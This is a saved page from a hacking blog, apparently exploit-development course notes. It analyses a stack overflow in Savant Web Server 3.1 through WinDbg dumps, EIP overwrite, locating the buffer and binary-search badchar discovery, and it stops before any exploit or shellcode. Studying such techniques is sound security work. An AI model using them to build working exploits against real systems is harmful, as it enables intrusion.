<!DOCTYPE html>
<html class="" lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    
        <script>
            if (location.host != new URL("http:\/\/localhost:1313\/").host) location.href = "http:\/\/localhost:1313\/"
        </script>
    
    <meta name="viewport" content="width=device-width" />
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=7" />

    <link
    rel="icon"
    href='http://localhost:1313/favicon.png'
/>
<link
    rel="shortcut icon"
    href='http://localhost:1313/favicon.ico'
    type="image/x-icon"
/>
<link
    rel="apple-touch-icon"
    href='http://localhost:1313/apple-touch-icon.png'
/>

    <link
        rel="icon"
        href='http://localhost:1313/favicon.png'
        type="image/svg+xml"
    />

<title>
        
        purpurina - a place for hacking
    </title>

    
    <link href="http://localhost:1313/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" integrity="sha512-lydow8GLOLlYNOtHlksNCmGWWCBsbIEtikXpHzfWqx78HLlyQZHOzyLwPpKol4Th6aCwLUXOfODVYgwrd3nwKQ=="/>
    <link href="http://localhost:1313/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" integrity="sha512-tJxlgL6v1Y7kFf+qB8SloaAMKnOAw6WouknxXtIjkBux9Y/9aX81EUWOJO8c/3l98DmjG8brr4to7zaez606Fg=="/>

    
    
    <link type="text/css" rel="stylesheet" href=http://localhost:1313/css/styles.b88203936c598b692d9cbebd7da89eb34e544b8522ae4c14ca657761be96b80c2acee8e6631de04d99ee1bdbc1bcad4a3add6f47a2366f4a29e2c531782be1a8.css integrity="sha512-uIIDk2xZi2ktnL69faies05US4UirkwUymV3Yb6WuAwqzujmYx3gTZnuG9vBvK1KOt1vR6I2b0op4sUxeCvhqA==" />
<meta name="author" content="jaco" />

    
    
        <meta name="description" content="s-not-always-in-a-predictable-location&#34;&gt;Our buffer is not always in a predictable location&lt;/h1&gt;
&lt;p&gt;Normally, in the base stack overflows, after we overwrite EIP we see that the ESP register points to our controlled buffer, which would store the shellcode. Then, we find a JMP ESP to jump to our shellcode.
However, there are some scenarios in which our shellcode is not directly accessible via ESP, or in a predictable location in memory.
Sometimes, it is possible to store a payload &lt;strong&gt;somewhere else in the address space of the process,&lt;/strong&gt; and point to such address by &amp;ldquo;searching&amp;rdquo; for our payload in the code.
Let&amp;rsquo;s see how to do it.
First, we have the Savant Web Server 3.1, which has a vulnerability that allows us overwriting EIP via a large HTTP GET buffer:&lt;/p&gt;" />
    

<meta property="og:site_name"
    content='purpurina - a place for hacking' />

    <meta property="og:title" content="" />
    <meta property="og:type" content="article" />
    
    <meta
        property="article:author" content="jaco" />
    <meta
        property="article:published_time"
        content='0001-01-01T00:00:00Z&#43;0000' />
    
    <meta property="og:url" content="http://localhost:1313/posts/osed_egghunter_1/" />
    
    
    <meta property="og:image"
        content="http://localhost:1313/icon512.png" />
    
        <meta property="og:description" content="&lt;h1 id=&#34;our-buffer-is-not-always-in-a-predictable-location&#34;&gt;Our buffer is not always in a predictable location&lt;/h1&gt;
&lt;p&gt;Normally, in the base stack overflows, af" />
    

<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:domain"
      content='localhost:1313'
/>
<meta property="twitter:url" content="http://localhost:1313/posts/osed_egghunter_1/" />


    <meta name="twitter:title" content="" />
    
    
    
    <meta name="twitter:image"
        content="http://localhost:1313/icon512.png" />
    
        <meta name="twitter:description" content="&lt;h1 id=&#34;our-buffer-is-not-always-in-a-predictable-location&#34;&gt;Our buffer is not always in a predictable location&lt;/h1&gt;
&lt;p&gt;Normally, in the base stack overflows, af" />
    

<link rel="manifest" href="http://localhost:1313/manifest/index.json" />
</head>


<body>
        <div id="baseContainer"><header class="">
<div class="titleAndSearchContainer">
        <div id="titleContainer">
            
                <a class="unstyledLink" href="http://localhost:1313/">
                    <img src='http://localhost:1313/logo.jpg' alt='Logo'/>
                </a>
            
            <div class="rightOfLogo">
                <div class="titleAndHamburger">
                    <h1>
                        <a class="unstyledLink" href="http://localhost:1313/">purpurina - a place for hacking</a>
                        
                    </h1>
                    
                </div>
                <div id="wide_nav"><nav>
    
    <ul id="main-nav">
        <li><a href="http://localhost:1313/">Home</a></li>
        
            <li><a href="http://localhost:1313/posts/">Posts</a></li>
        
        
        
        
        
        
            <li><a href="http://localhost:1313/about/">About</a></li>
        
        
            <li><a href="http://localhost:1313/tags/">Tags</a></li>
        
        
    </ul>
</nav>
</div>
            </div>
        </div>
        <div class="search">
    <input id="searchbar" type="text" placeholder='Search' />
    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
</div>
<script>
    function newSearch() {
        let term = searchbar.value.trim();
        if (!term) return;
        location.href = `/search/?q=${term}`;
    }
    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
</script>

    </div>
    <div id="links">
        
        
        <a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://www.linkedin.com/in/jacobocasado/?originalSubdomain=es">
    
    
        &#xf0e1;
    
    <span>
        LinkedIn
    </span>
</a>

    </div>
    

</header>
<div id="contentContainer">
                <div id="content">
                    <main>
<article class="card single">
    
        <h1></h1>
    
    
        <p class="date">
            <span title='Date'> </span>
    0001-01-01

</p>
    
    
    
    
    <div><h1 id="our-buffer-is-not-always-in-a-predictable-location">Our buffer is not always in a predictable location</h1>
<p>Normally, in the base stack overflows, after we overwrite EIP we see that the ESP register points to our controlled buffer, which would store the shellcode. Then, we find a JMP ESP to jump to our shellcode.
However, there are some scenarios in which our shellcode is not directly accessible via ESP, or in a predictable location in memory.
Sometimes, it is possible to store a payload <strong>somewhere else in the address space of the process,</strong> and point to such address by &ldquo;searching&rdquo; for our payload in the code.
Let&rsquo;s see how to do it.
First, we have the Savant Web Server 3.1, which has a vulnerability that allows us overwriting EIP via a large HTTP GET buffer:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">011</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">g</span>
</span></span><span style="display:flex;"><span>(c3c<span style="color:#ae81ff">.18f</span><span style="color:#ae81ff">0</span>)<span style="color:#f92672">:</span> Access violation <span style="color:#f92672">-</span> code <span style="color:#a6e22e">c0000005</span> (first chance)
</span></span><span style="display:flex;"><span>First chance exceptions are reported before any exception handling.
</span></span><span style="display:flex;"><span>This exception may be expected and handled.
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span>ffffffff ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">01775</span><span style="color:#ae81ff">868</span> ecx<span style="color:#f92672">=</span>e319c4c3 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> esi<span style="color:#f92672">=</span><span style="color:#ae81ff">01775</span><span style="color:#ae81ff">868</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">0041703</span>c
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">02</span>d2ea1c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00010202</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">41414141</span> <span style="color:#f92672">??</span>              <span style="color:#f92672">???</span><span style="color:#960050;background-color:#1e0010">¡</span>
</span></span></code></pre></div><p>We have managed to overwrite the EIP.
However, let&rsquo;s inspect ESP to see how much bytes do we have stored:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dd esp L5
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span>d2ea1c  <span style="color:#ae81ff">00414141</span> <span style="color:#ae81ff">02</span>d2ea74 <span style="color:#ae81ff">0041703</span>c <span style="color:#ae81ff">01775</span><span style="color:#ae81ff">868</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span>d2ea2c  <span style="color:#ae81ff">01775</span><span style="color:#ae81ff">868</span>
</span></span></code></pre></div><p>Only three bytes have been available. The fourth byte is a null terminator, which means that our payload probably is stored as a string. Therefore, we cannot put our shellcode as we would in a vanilla stack overflow.
Whenever we deal with a limited amount of space, we should try to increase the size of the buffer to see if that results in more space for our overflow.</p>
<p>However, if the buffer size is increased, even by one byte, <strong>a different crash where we do not gain control over the instruction pointer happens:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">g</span>
</span></span><span style="display:flex;"><span>(c98<span style="color:#ae81ff">.664</span>)<span style="color:#f92672">:</span> Access violation <span style="color:#f92672">-</span> code <span style="color:#a6e22e">c0000005</span> (first chance)
</span></span><span style="display:flex;"><span>First chance exceptions are reported before any exception handling.
</span></span><span style="display:flex;"><span>This exception may be expected and handled.
</span></span><span style="display:flex;"><span><span style="color:#f92672">***</span> WARNING: Unable to verify checksum <span style="color:#66d9ef">for</span> C:<span style="color:#960050;background-color:#1e0010">\</span>Savant<span style="color:#960050;background-color:#1e0010">\</span>Savant.exe
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">01745</span><span style="color:#ae81ff">868</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">005</span>a0000 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">005</span>a0000 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">01745</span><span style="color:#ae81ff">868</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">0041703</span>c
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0040</span>c05f esp<span style="color:#f92672">=</span><span style="color:#ae81ff">04f6e6</span>a8 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">6</span>ea14 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00010246</span>
</span></span></code></pre></div><p>Note that putting a big buffer always will make things go wrong! Start by a little buffer and keep incrementing it.</p>
<p>Let&rsquo;s go back to the scenario where we control EIP.
Let&rsquo;s analyze if any register stores our payload, so we can maybe perform a JMP REGISTER operation. An example with EBX:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dds ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00505</span><span style="color:#ae81ff">868</span>  <span style="color:#ae81ff">00001</span><span style="color:#ae81ff">910</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00505</span><span style="color:#ae81ff">86</span>c  <span style="color:#ae81ff">000003e8</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00505</span><span style="color:#ae81ff">870</span>  <span style="color:#ae81ff">00000000</span>
</span></span></code></pre></div><p>None of the registers point to our buffer.</p>
<p>The next thing is to search in the stack frame if there is any pointer to our buffer:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dds esp L2
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ea1c  <span style="color:#ae81ff">00414141</span> Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ea20  <span style="color:#ae81ff">0505</span>ea74
</span></span></code></pre></div><p>By some reason, the second DWORD in a stack points to a <strong>location that is very close to the stack! It&rsquo;s like pointing an internal stack location.</strong> Let&rsquo;s analyze it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dc <span style="color:#ae81ff">0505</span>ea74
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ea74  <span style="color:#ae81ff">00544547</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>  GET.............
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ea84  <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">4141412f</span> <span style="color:#ae81ff">41414141</span>  ........<span style="color:#f92672">/</span>AAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ea94  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>eaa4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>eab4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>eac4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ead4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>eae4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span></code></pre></div><p>It looks like it&rsquo;s a pointer to the HTTP request content, as, in such location, we can see that there is the HTTP Method stored, followed by several null bytes, and our controlled buffer.</p>
<h1 id="badchars-do-not-break-the-buffer-they-break-the-program-behavior">Badchars do not break the buffer, they break the program behavior</h1>
<p>In the previous buffer overflows, when inserting badchars to check the presence of them, we could see the specific characters that make the buffer break, as the application still crashes and we can inspect the badchar buffer in depth.</p>
<p>But there can be the case where inserting badchars just <strong>prevent the application from crashing, or that make the application crash but the EIP is not overwritten anymore.</strong> In that case, we cannot see which one is the problematic one, but we have to infer it by other means.
That is why it is important to always try sending a buffer with the same character, and always a character that is commonly accepted, as &ldquo;A&rdquo;.</p>
<p>In order to detect which badchars are preventing the application from crashing, we will do a binary search.
The first half of the badchars will be sent, while the other is not sent. We will analyze in which half of the badchars array the application keeps running, and in which one does not. We will keep repeating such process iteratively until we find the badchar(s) that are preventing the application from running.</p>
<p>By doing this in our Savant application, we overwrite the instruction pointer when the second half of the badchars are sent. That means that the badchars are in the first half. We will break the first half in two to detect which badchars are the problematic, and so on.
After deleting some badchars, we see that the app crashes and EIP is overwritten, but we have to inspect if any of the badchars are not stored in the buffer like we previously did n the base buffer overflow:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">005</span><span style="color:#f92672">&gt;</span> dd esp L30
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea1c  <span style="color:#ae81ff">0473f</span>e00 <span style="color:#ae81ff">0473</span>ea74 <span style="color:#ae81ff">0041703</span>c <span style="color:#ae81ff">005</span>d2bf0
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea2c  <span style="color:#ae81ff">005</span>d2bf0 <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea3c  <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea4c  <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea5c  <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea6c  <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000002</span> <span style="color:#ae81ff">00544547</span> <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea7c  <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea8c  <span style="color:#ae81ff">0302012f</span> <span style="color:#ae81ff">07060504</span> <span style="color:#ae81ff">0</span>c0b0908 <span style="color:#ae81ff">11100f</span><span style="color:#ae81ff">0</span>e
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea9c  <span style="color:#ae81ff">15141312</span> <span style="color:#ae81ff">19181716</span> <span style="color:#ae81ff">1</span>d1c1b1a <span style="color:#ae81ff">21201f</span><span style="color:#ae81ff">1</span>e
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eaac  <span style="color:#ae81ff">25242322</span> <span style="color:#ae81ff">29282726</span> <span style="color:#ae81ff">2</span>d2c2b2a <span style="color:#ae81ff">31302f</span><span style="color:#ae81ff">2</span>e
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eabc  <span style="color:#ae81ff">35343332</span> <span style="color:#ae81ff">39383736</span> <span style="color:#ae81ff">3</span>d3c3b3a <span style="color:#ae81ff">41403f</span><span style="color:#ae81ff">3</span>e
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eacc  <span style="color:#ae81ff">45444342</span> <span style="color:#ae81ff">49484746</span> <span style="color:#ae81ff">4</span>d4c4b4a <span style="color:#ae81ff">51504f</span><span style="color:#ae81ff">4</span>e
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">005</span><span style="color:#f92672">&gt;</span> db <span style="color:#ae81ff">0473</span>ea8D LFF
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea8d  <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">02</span> <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">05</span> <span style="color:#ae81ff">06</span> <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span> <span style="color:#ae81ff">0</span>b <span style="color:#ae81ff">0</span>c <span style="color:#ae81ff">0</span>e <span style="color:#ae81ff">0f</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">12</span>  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea9d  <span style="color:#ae81ff">13</span> <span style="color:#ae81ff">14</span> <span style="color:#ae81ff">15</span> <span style="color:#ae81ff">16</span> <span style="color:#ae81ff">17</span> <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">19</span> <span style="color:#ae81ff">1</span>a<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>b <span style="color:#ae81ff">1</span>c <span style="color:#ae81ff">1</span>d <span style="color:#ae81ff">1</span>e <span style="color:#ae81ff">1f</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span>  ............. <span style="color:#f92672">!</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eaad  <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">24</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">26</span> <span style="color:#ae81ff">27</span> <span style="color:#ae81ff">28</span> <span style="color:#ae81ff">29</span> <span style="color:#ae81ff">2</span>a<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>b <span style="color:#ae81ff">2</span>c <span style="color:#ae81ff">2</span>d <span style="color:#ae81ff">2</span>e <span style="color:#ae81ff">2f</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">32</span>  <span style="color:#960050;background-color:#1e0010">#$</span><span style="color:#f92672">%&amp;</span><span style="color:#960050;background-color:#1e0010">&#39;</span>()<span style="color:#f92672">*+</span>,<span style="color:#f92672">-</span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">012</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eabd  <span style="color:#ae81ff">33</span> <span style="color:#ae81ff">34</span> <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">38</span> <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">3</span>a<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>b <span style="color:#ae81ff">3</span>c <span style="color:#ae81ff">3</span>d <span style="color:#ae81ff">3</span>e <span style="color:#ae81ff">3f</span> <span style="color:#ae81ff">40</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">42</span>  <span style="color:#ae81ff">3456789</span><span style="color:#f92672">:</span>;<span style="color:#f92672">&lt;=&gt;?</span><span style="color:#960050;background-color:#1e0010">@</span>AB
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eacd  <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">47</span> <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">49</span> <span style="color:#ae81ff">4</span>a<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>b <span style="color:#ae81ff">4</span>c <span style="color:#ae81ff">4</span>d <span style="color:#ae81ff">4</span>e <span style="color:#ae81ff">4f</span> <span style="color:#ae81ff">50</span> <span style="color:#ae81ff">51</span> <span style="color:#ae81ff">52</span>  CDEFGHIJKLMNOPQR
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eadd  <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">54</span> <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">56</span> <span style="color:#ae81ff">57</span> <span style="color:#ae81ff">58</span> <span style="color:#ae81ff">59</span> <span style="color:#ae81ff">5</span>a<span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>b <span style="color:#ae81ff">5</span>c <span style="color:#ae81ff">5</span>d <span style="color:#ae81ff">5</span>e <span style="color:#ae81ff">5f</span> <span style="color:#ae81ff">60</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">62</span>  STUVWXYZ[<span style="color:#960050;background-color:#1e0010">\</span>]<span style="color:#f92672">^</span>_<span style="color:#960050;background-color:#1e0010">`</span>ab
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eaed  <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">67</span> <span style="color:#ae81ff">68</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">6</span>a<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>b <span style="color:#ae81ff">6</span>c <span style="color:#ae81ff">6</span>d <span style="color:#ae81ff">6</span>e <span style="color:#ae81ff">6f</span> <span style="color:#ae81ff">70</span> <span style="color:#ae81ff">71</span> <span style="color:#ae81ff">72</span>  cdefghijklmnopqr
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eafd  <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">76</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">79</span> <span style="color:#ae81ff">7</span>a<span style="color:#f92672">-</span><span style="color:#ae81ff">7</span>b <span style="color:#ae81ff">7</span>c <span style="color:#ae81ff">7</span>d <span style="color:#ae81ff">7</span>e <span style="color:#ae81ff">7f</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">81</span> <span style="color:#ae81ff">82</span>  stuvwxyz{<span style="color:#f92672">|</span>}<span style="color:#f92672">~</span>....
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eb0d  <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">84</span> <span style="color:#ae81ff">85</span> <span style="color:#ae81ff">86</span> <span style="color:#ae81ff">87</span> <span style="color:#ae81ff">88</span> <span style="color:#ae81ff">89</span> <span style="color:#ae81ff">8</span>a<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">8</span>c <span style="color:#ae81ff">8</span>d <span style="color:#ae81ff">8</span>e <span style="color:#ae81ff">8f</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">91</span> <span style="color:#ae81ff">92</span>  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eb1d  <span style="color:#ae81ff">93</span> <span style="color:#ae81ff">94</span> <span style="color:#ae81ff">95</span> <span style="color:#ae81ff">96</span> <span style="color:#ae81ff">97</span> <span style="color:#ae81ff">98</span> <span style="color:#ae81ff">99</span> <span style="color:#ae81ff">9</span>a<span style="color:#f92672">-</span><span style="color:#ae81ff">9</span>b <span style="color:#ae81ff">9</span>c <span style="color:#ae81ff">9</span>d <span style="color:#ae81ff">9</span>e <span style="color:#ae81ff">9f</span> a0 a1 a2  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eb2d  a3 a4 a5 a6 a7 a8 a9 aa<span style="color:#f92672">-</span>ab ac ad ae af b0 b1 b2  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eb3d  b3 b4 b5 b6 b7 b8 b9 ba<span style="color:#f92672">-</span>bb bc bd be bf c0 c1 c2  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eb4d  c3 c4 c5 c6 c7 c8 c9 ca<span style="color:#f92672">-</span>cb cc cd ce cf d0 d1 d2  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eb5d  d3 d4 d5 d6 d7 d8 d9 da<span style="color:#f92672">-</span>db dc dd de df e0 e1 e2  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eb6d  e3 e4 e5 e6 e7 e8 e9 ea<span style="color:#f92672">-</span>eb ec ed ee ef f0 f1 f2  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eb7d  f3 f4 f5 f6 f7 f8 f9 fa<span style="color:#f92672">-</span>fb fc fd fe ff <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>     .............AA
</span></span></code></pre></div><p>0D is not appearing, so we can delete it although it is not breaking the buffer, it is completely ignored so if our shellcode has such character it probably will be skipped by the program.
After deleting 0d, the EIP does not point to our controlled location and we have to perform a binary search again.
